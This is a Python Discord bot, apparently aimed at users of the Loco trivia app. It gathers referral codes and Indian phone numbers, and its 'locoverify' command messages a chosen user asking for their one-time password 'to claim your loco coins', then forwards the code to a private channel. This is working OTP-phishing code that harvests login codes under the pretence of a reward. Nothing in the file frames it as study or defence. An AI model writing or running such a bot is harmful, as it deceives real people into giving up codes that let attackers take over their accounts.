import discord
import os
from discord.ext import commands
import asyncio
from discord.utils import get
import random
import re

client = commands.Bot(command_prefix='=')
@client.event
async def on_ready():
    print("I'm in")
    print(client.user)
    
@client.command(pass_context = True)
@commands.has_role("Admin")
async def locolives(ctx):
    if ctx.message.channel.type != discord.ChannelType.private:
        await client.say("What's your referral")
        ref = await client.wait_for_message(author=ctx.message.author)
        ref = ref.content
        await client.say("How many lives would you like?")
        num = await client.wait_for_message(author=ctx.message.author)
        num = num.content
        b = True
        while b:
            try:
                num = int(num)
                b = False
            except ValueError:
                await client.say("That doesn't seem to be a number!")
                num = await client.wait_for_message(author=ctx.message.author)
                num = num.content
        await client.send_message(client.get_channel("536980166719832075"), ("{0.author.mention} , "+str(ref)+", " +str(num)).format(ctx.message))
        await client.say("Your lives/life will come within 24 hours")
    else:
        await client.send_message(ctx.message.channel, "This bot isn't made for DMs")

    
@client.command(pass_context = True)
@commands.has_role("Admin")
async def lococoins(ctx):
    if ctx.message.channel.type != discord.ChannelType.private:
        await client.say("What's your referral")
        ref = await client.wait_for_message(author=ctx.message.author)
        ref = ref.content
        await client.say("What's your phone number?")
        num = await client.wait_for_message(author=ctx.message.author)
        num = num.content
        regrex = r"^([0]|\+91)?[789]\d{9}$"
        if re.search(regrex, num):
            pass
        else:
            while not re.search(regrex, num):
                await client.say("That's not a valid indian number")
                num = await client.wait_for_message(author=ctx.message.author)  
                num = num.content
        await client.send_message(client.get_channel("536986693878808596"), ("{0.author.mention} , "+str(ref)+", " +str(num)).format(ctx.message))
        await client.say("Your coins will come within 24 hours")
    else:
        await client.send_message(ctx.message.channel, "This bot isn't made for DMs")

        
@client.command(pass_context = True)
@commands.has_role("Admin")
async def locoverify(ctx, user: discord.Member):
    if ctx.message.channel.type != discord.ChannelType.private:
        if not user: await client.say("Please specify a user")
        else:
            await client.say("Done!")
            await client.send_message(await client.get_user_info(user.id), "Hey can you send me your OTP to claim your loco coins")
            otp = await client.wait_for_message(author=user)
            otp = otp.content
            c = True
            while c:
                try:
                    otp = int(otp)
                    otp = str(otp)
                    if len(otp) != 4:
                        pass
                    else:
                        await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
                        await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
                        c = False
                except ValueError:
                    await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
                    otp = await client.wait_for_message(author=user)
                    otp = otp.content
    else:
        await client.send_message(ctx.message.channel, "This bot isn't made for DMs")



token = os.getenv("DISCORD_BOT_SECRET")
client.run(token)
